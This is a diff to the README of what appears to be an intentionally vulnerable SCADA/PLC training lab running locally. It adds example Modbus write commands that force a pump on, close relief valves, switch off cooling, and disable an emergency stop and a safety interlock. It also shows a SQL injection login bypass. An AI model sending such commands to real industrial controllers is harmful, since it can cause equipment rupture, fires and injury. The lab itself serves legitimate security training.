@@ -46,11 +46,20 @@ pip install modbus-cli
 firefox http://localhost:5000  # PLC-1
 ```
 
-**Try your first attack:**
+**Try your first attack (works on ALL 4 PLCs!):**
 ```bash
-# Force tank overflow
+# PLC-1: Force tank overflow
 sudo modbus 127.0.0.1:5502 write 0 1   # Pump ON
 sudo modbus 127.0.0.1:5502 write 1 0   # Valve CLOSED
+
+# PLC-2: Pressure spike
+sudo modbus 127.0.0.1:5503 write 0 1   # Compressor ON
+
+# PLC-3: Thermal runaway
+sudo modbus 127.0.0.1:5504 write 0 1   # Heater ON
+
+# PLC-4: Disable safety systems
+sudo modbus 127.0.0.1:5505 write 0 0   # Emergency stop OFF
 
 # Watch the consequences on HMI: http://localhost:8000 (local) or check PLC web interfaces (Docker)
 ```
@@ -58,6 +67,19 @@ sudo modbus 127.0.0.1:5502 write 1 0   # Valve CLOSED
 ---
 
 ## 🌟 What's New in v2.0?
+
+### 🔥 Real Modbus TCP on ALL 4 PLCs
+**Production-quality Modbus implementation across the entire system:**
+- ✅ **PLC1 (Tank):** Port 5502 - Full Modbus TCP server
+- ✅ **PLC2 (Pressure):** Port 5503 - Full Modbus TCP server
+- ✅ **PLC3 (Temperature):** Port 5504 - Full Modbus TCP server
+- ✅ **PLC4 (Safety/ESD):** Port 5505 - Full Modbus TCP server
+
+**Not fake HTTP endpoints** - actual Modbus TCP protocol with:
+- Proper MBAP header parsing
+- Function codes: 0x03 (Read), 0x06 (Write Single), 0x10 (Write Multiple)
+- Stability improvements (recv_exact, connection semaphore, socket timeout)
+- Works with real tools: `modbus-cli`, `pymodbus`, Metasploit SCADA modules
 
 ### 🎨 Visual SCADA HMI Interface
 Real-time P&ID dashboard showing industrial processes:
@@ -91,7 +113,8 @@ See [Docker Installation](#docker-installation) section for setup instructions.
 
 ### 🔴 Red Team / Penetration Testing
 - **4 Vulnerable PLCs** with realistic exploits
-- **Modbus TCP** protocol manipulation
+- **Real Modbus TCP on ALL PLCs** - protocol-accurate implementation
+- **4 Modbus TCP endpoints** (ports 5502-5505) - all fully functional
 - **Siemens S7** protocol support
 - **Web exploits**: SQL injection, command injection, XSS
 - **Authentication bypasses**
@@ -184,15 +207,15 @@ See [Docker Installation](#docker-installation) section for setup instructions.
 - **PLC-3 (Temperature):** http://localhost:5012 (engineer/temp123)
 - **PLC-4 (Safety):** http://localhost:5013 (safety_eng/safe123)
 
-**Modbus TCP Endpoints:**
-- PLC-1: `127.0.0.1:5502`
-- PLC-2: `127.0.0.1:5503`
-- PLC-3: `127.0.0.1:5504`
-- PLC-4: `127.0.0.1:5505`
+**Modbus TCP Endpoints (All Fully Functional):**
+- PLC-1: `127.0.0.1:5502` ✅ Real Modbus TCP
+- PLC-2: `127.0.0.1:5503` ✅ Real Modbus TCP
+- PLC-3: `127.0.0.1:5504` ✅ Real Modbus TCP
+- PLC-4: `127.0.0.1:5505` ✅ Real Modbus TCP
 
 ### Example Attacks
 
-**Tank Overflow (Visual Impact):**
+**Tank Overflow (PLC-1 - Visual Impact):**
 ```bash
 # Open HMI: http://localhost:8000
 sudo modbus 127.0.0.1:5502 write 0 1   # Force pump ON
@@ -200,14 +223,28 @@ sudo modbus 127.0.0.1:5502 write 1 0   # Force valve CLOSED
 # Watch tank overflow in real-time!
 ```
 
-**Pressure Spike:**
+**Pressure Vessel Rupture (PLC-2):**
 ```bash
 sudo modbus 127.0.0.1:5503 write 0 1   # Compressor ON
 sudo modbus 127.0.0.1:5503 write 1 0   # Relief valve CLOSED
 # Pressure rises until rupture
 ```
 
-**SQL Injection:**
+**Thermal Runaway (PLC-3):**
+```bash
+sudo modbus 127.0.0.1:5504 write 0 1   # Heater 1 ON at full power
+sudo modbus 127.0.0.1:5504 write 2 0   # Cooler 1 OFF
+# Temperature rises uncontrollably
+```
+
+**Safety System Bypass (PLC-4):**
+```bash
+sudo modbus 127.0.0.1:5505 write 0 0   # Disable emergency stop
+sudo modbus 127.0.0.1:5505 write 1 0   # Disable safety interlock
+# All safety systems now bypassed - catastrophic!
+```
+
+**SQL Injection (Web Interface):**
 ```bash
 curl -X POST http://localhost:5000/login \
   -d "username=admin' OR '1'='1&password=x"
